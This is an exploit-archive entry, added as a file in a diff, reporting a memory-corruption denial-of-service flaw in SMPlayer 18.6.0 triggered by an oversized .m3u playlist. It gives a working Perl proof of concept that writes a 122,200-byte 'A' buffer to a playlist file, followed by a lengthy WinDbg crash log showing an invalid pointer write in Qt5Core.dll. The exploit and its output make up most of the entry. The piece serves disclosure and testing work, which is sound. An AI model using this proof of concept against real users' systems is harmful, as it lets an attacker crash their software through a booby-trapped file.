@@ -1,0 +1,213 @@
+id: 30772
+date: 07/24/2018
+title: SMPlayer 18.6.0 Memory Corruption Exploit
+author: ZwX
+cves: 
+
+SMPlayer 18.6.0 - Memory Corruption (DoS) Vulnerability
+
+Product & Service Introduction:
+===============================
+SMPlayer is a free multimedia player for Windows and Linux with built-in codecs that can play virtually any video and audio format. 
+It does not need any additional codecs. Install SMPlayer with ease and you'll be able to instantly play all audio and video formats 
+without having to search for and install additional codecs.
+
+(Copy of the Vendor Homepage: http://www.smplayer.info/)
+
+Technical Details & Description:
+================================
+A memory corruption vulnerability resulting in a denial of service has been discovered in the official SMPlayer v18.6.0 software.
+The vulnerability is caused by an invalid pointer corruption while processing a corrupted .m3u file through the SMPlayer reader.
+Which could be exploited by attackers to crash a complete software process via denial of service. The vulnerability is located in
+the Qt5Core.dll when processing an .m3u file on import.
+
+Vulnerable Modules:
+[+] Open  
+[+] File
+[+] Reading
+
+
+Proof of Concept (PoC):
+=======================
+The vulnerability can be exploited by local attackers via import or by remote attackers via user interaction. 
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below.
+
+
+PoC: Exploitation (Perl)
+#!/usr/bin/perl
+my $Buff = "A" x 122200;
+open(MYFILE,'>>Corruption.m3u');
+print MYFILE $Buff;
+close(MYFILE);
+print " POC Created by ZwX";
+
+
+--- PoC Debug Session Logs (Windbg) ---
+EXCEPTION_RECORD:  (.exr -1)
+ExceptionAddress: 68b724d9 (Qt5Core!ZN14QTemporaryFile16createNativeFileER5QFile+0x000005f9)
+   ExceptionCode: c0000005 (Access violation)
+  ExceptionFlags: 00000000
+NumberParameters: 2
+   Parameter[0]: 00000001
+   Parameter[1]: 020ffffe
+Attempt to write to address 020ffffe
+
+FAULTING_THREAD:  00000994
+DEFAULT_BUCKET_ID:  INVALID_POINTER_WRITE
+PROCESS_NAME:  smplayer.exe
+
+FOLLOWUP_IP: 
+Qt5Core!ZN14QTemporaryFile16createNativeFileER5QFile+5f9
+68b724d9 66895702        mov     word ptr [edi+2],dx
+
+WRITE_ADDRESS:  020ffffe 
+ERROR_CODE: (NTSTATUS) 0xc0000005 - <Unable to get error code text>
+EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - <Unable to get error code text>
+EXCEPTION_CODE_STR:  c0000005
+EXCEPTION_PARAMETER1:  00000001
+EXCEPTION_PARAMETER2:  020ffffe
+WATSON_BKT_PROCSTAMP:  5b2f993b
+WATSON_BKT_PROCVER:  18.6.0.0
+PROCESS_VER_PRODUCT:  SMPlayer for Windows (32-bit)
+WATSON_BKT_MODULE:  Qt5Core.dll
+WATSON_BKT_MODSTAMP:  5715839e
+WATSON_BKT_MODOFFSET:  f24d9
+WATSON_BKT_MODVER:  5.6.0.0
+MODULE_VER_PRODUCT:  Qt5
+BUILD_VERSION_STRING:  7601.24168.x86fre.win7sp1_ldr.180608-0600
+MODLIST_WITH_TSCHKSUM_HASH:  ec621d6b16ea647fcad270b607987d6790c6372e
+MODLIST_SHA1_HASH:  22b51cf1164db3537920237889937f627826c434
+NTGLOBALFLAG:  70
+PROCESS_BAM_CURRENT_THROTTLED: 0
+PROCESS_BAM_PREVIOUS_THROTTLED: 0
+APPLICATION_VERIFIER_FLAGS:  0
+PRODUCT_TYPE:  1
+SUITE_MASK:  784
+DUMP_TYPE:  fe
+ANALYSIS_SESSION_TIME:  07-20-2018 16:01:44.0461
+ANALYSIS_VERSION: 10.0.17134.12 x86fre
+
+THREAD_ATTRIBUTES: 
+OS_LOCALE:  FRA
+
+PROBLEM_CLASSES: 
+    ID:     [0n309]
+    Type:   [@ACCESS_VIOLATION]
+    Class:  Addendum
+    Scope:  BUCKET_ID
+    Name:   Omit
+    Data:   Omit
+    PID:    [Unspecified]
+    TID:    [0x994]
+    Frame:  [0] : Qt5Core!ZN14QTemporaryFile16createNativeFileER5QFile
+
+    ID:     [0n282]
+    Type:   [INVALID_POINTER_WRITE]
+    Class:  Primary
+    Scope:  DEFAULT_BUCKET_ID (Failure Bucket ID prefix)
+            BUCKET_ID
+    Name:   Add
+    Data:   Omit
+    PID:    [Unspecified]
+    TID:    [0x994]
+    Frame:  [0] : Qt5Core!ZN14QTemporaryFile16createNativeFileER5QFile
+
+BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_WRITE
+PRIMARY_PROBLEM_CLASS:  APPLICATION_FAULT
+LAST_CONTROL_TRANSFER:  from 68b552b9 to 68b724d9
+
+STACK_TEXT:  
+WARNING: Stack unwind information not available. Following frames may be wrong.
+0022c968 68b552b9 00000023 0022ca38 0022ca08 Qt5Core!ZN14QTemporaryFile16createNativeFileER5QFile+0x5f9
+0022c9c8 68b72b3c 00000003 00000000 037ef398 Qt5Core!ZN5QFile4openE6QFlagsIN9QIODevice12OpenModeFlagEE+0x59
+0022ca58 68b94738 0022cab8 0022cae0 00000000 Qt5Core!ZN14QTemporaryFile4openE6QFlagsIN9QIODevice12OpenModeFlagEE+0x2c
+0022cae8 68b94d99 00000000 00000000 00666c30 Qt5Core!ZN9QSettings5eventEP6QEvent+0x378
+0022cb18 00445290 0022cb7c 00000000 00000000 Qt5Core!ZN9QSettings5eventEP6QEvent+0x9d9
+0022cba8 004502ad 0022cbdc 00000002 027b14d8 smplayer+0x45290
+0022cc08 0046961a 027b4388 0022cd38 00000007 smplayer+0x502ad
+0022cc88 0046ad1c 0022cd38 0022cd3c 00000004 smplayer+0x6961a
+0022cd68 0046bfea 0022cdb8 00000000 0022cda8 smplayer+0x6ad1c
+0022cdd8 68c15612 027b1430 00000000 00000022 smplayer+0x6bfea
+0022ce78 004c08cc 027b8a48 00000007 00000000 Qt5Core!ZN11QMetaObject8activateEP7QObjectiiPPv+0x212
+0022cf18 004c98e1 00000000 00000000 00000000 smplayer+0xc08cc
+0022d058 004f97f0 0022d0ac 00000002 00686bc4 smplayer+0xc98e1
+0022d0d8 00501901 0022d1a4 021d56f0 0022d128 smplayer+0xf97f0
+0022d1d8 00523690 00000000 00000000 000002aa smplayer+0x101901
+0022d228 68c15612 021d56f0 00000000 0000000b smplayer+0x123690
+0022d2c8 00cb4238 02874d38 00000003 00000001 Qt5Core!ZN11QMetaObject8activateEP7QObjectiiPPv+0x212
+0022d2f8 00e2bfb0 00000000 68d2c200 00000000 Qt5Widgets!ZN7QAction8activateENS_11ActionEventE+0x98
+0022d398 00e2a9de 0022d3d0 00000000 00000420 Qt5Widgets!ZN5QMenu18setToolTipsVisibleEb+0x2a0
+0022d3a8 77156370 00000000 00000000 000000dc Qt5Widgets!ZN5QMenu7hoveredEP7QAction+0xd1e
+0022d498 00e360ba 0022d820 021574e8 0000000c ntdll!RtlpFreeHeap+0xb7a
+0022d4a8 6aa8f5f1 021181e0 0000000c 0022d518 Qt5Widgets!ZN5QMenu5eventEP6QEvent+0x11a
+0022d4b8 68a9e6af 0000001b 0371e2f8 00000010 qwindows+0xf5f1
+0022d518 61b76f8b 0022d820 00000000 00000048 Qt5Core!ZN7QThread21setTerminationEnabledEb+0x4af
+0022d538 00cbfcc1 028b7ae0 0022d820 0022d848 Qt5Gui!ZNK11QMouseEvent5flagsEv+0xb
+0022d5a4 771c5c6e 02148bc0 00000001 00000000 Qt5Widgets!ZN12QApplication6notifyEP7QObjectP6QEvent+0xb51
+0022d5d4 771c6c18 00360138 00000029 0000000f ntdll!RtlpValidateHeap+0x20
+0022d678 61b69e7a 0212a8a8 00000000 00000000 ntdll!RtlDebugFreeHeap+0x276
+0022d6a8 68bf5259 028b7ae0 0022d820 0022d77c Qt5Gui!ZNK7QWindow8geometryEv+0x1ba
+0022d6f8 00cbe96c 028b7ae0 0022d820 02957d40 Qt5Core!ZN16QCoreApplication15notifyInternal2EP7QObjectP6QEvent+0x109
+0022d898 00d1537a 0022dbb0 0022dbb0 00000000 Qt5Widgets!ZN19QApplicationPrivate14sendMouseEventEP7QWidgetP11QMouseEventS1_S1_PS1_R8QPointerIS0_Eb+0x1dc
+0022d8c8 68bf4cef 00000000 03766523 00000000 Qt5Widgets!ZN14QDesktopWidget11qt_metacallEN11QMetaObject4CallEiPPv+0x48ba
+0022fe38 005d7d52 00000001 02142fb8 009751a0 Qt5Core!ZN23QCoreApplicationPrivate29threadRequiresCoreApplicationEv+0xf
+0022fe98 00635f1d 00400000 00000000 00962598 smplayer+0x1d7d52
+0022feb8 004013e2 00363aa8 00000019 00000001 smplayer+0x235f1d
+0022ff88 7560efac 7ffd3000 0022ffd4 77163628 smplayer+0x13e2
+0022ff94 77163628 7ffd3000 77dd4275 00000000 kernel32!BaseThreadInitThunk+0x12
+0022ffd4 771635fb 004014c0 7ffd3000 00000000 ntdll!__RtlUserThreadStart+0x70
+0022ffec 00000000 004014c0 7ffd3000 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+STACK_COMMAND:  ~0s ; .cxr ; kb
+THREAD_SHA1_HASH_MOD_FUNC:  ad89141657ca48c6d034b3799d071b71260125cc
+THREAD_SHA1_HASH_MOD_FUNC_OFFSET:  83a292b67a1ed4f6616c9779d9411dcb769f07bc
+THREAD_SHA1_HASH_MOD:  87d5f5752469a4414a8f7facb8849b26ec792c75
+FAULT_INSTR_CODE:  2578966
+SYMBOL_STACK_INDEX:  0
+SYMBOL_NAME:  Qt5Core!ZN14QTemporaryFile16createNativeFileER5QFile+5f9
+FOLLOWUP_NAME:  MachineOwner
+MODULE_NAME: Qt5Core
+IMAGE_NAME:  Qt5Core.dll
+DEBUG_FLR_IMAGE_TIMESTAMP:  5715839e
+FAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_Qt5Core.dll!ZN14QTemporaryFile16createNativeFileER5QFile
+BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_WRITE_Qt5Core!ZN14QTemporaryFile16createNativeFileER5QFile+5f9
+FAILURE_EXCEPTION_CODE:  c0000005
+FAILURE_IMAGE_NAME:  Qt5Core.dll
+BUCKET_ID_IMAGE_STR:  Qt5Core.dll
+FAILURE_MODULE_NAME:  Qt5Core
+BUCKET_ID_MODULE_STR:  Qt5Core
+
+--------------------------------------
+0:000> lmvm Qt5Core
+Browse full module list
+start    end        module name
+68a80000 68faf000   Qt5Core    (export symbols)       C:SMPlayerQt5Core.dll
+    Loaded symbol image file: C:SMPlayerQt5Core.dll
+    Image path: C:SMPlayerQt5Core.dll
+    Image name: Qt5Core.dll
+    Browse all global symbols  functions  data
+    Timestamp:        Mon Apr 18 18:02:22 2016 (5715839E)
+    CheckSum:         0052E947
+    ImageSize:        0052F000
+    File version:     5.6.0.0
+    Product version:  5.6.0.0
+    File flags:       0 (Mask 3F)
+    File OS:          4 Unknown Win32
+    File type:        2.0 Dll
+    File date:        00000000.00000000
+    Translations:     0409.04b0
+    Information from resource tables:
+        CompanyName:      The Qt Company Ltd
+        ProductName:      Qt5
+        OriginalFilename: Qt5Core.dll
+        ProductVersion:   5.6.0.0
+        FileVersion:      5.6.0.0
+        FileDescription:  C++ application development framework.
+        LegalCopyright:   Copyright (C) 2015 The Qt Company Ltd.
+
+
+Security Risk:
+==============
+The security risk of the memory corruption that occurs by an invalid pointer write on import is estimated as medium.
+
+#  0day.today [2023-03-24]  #
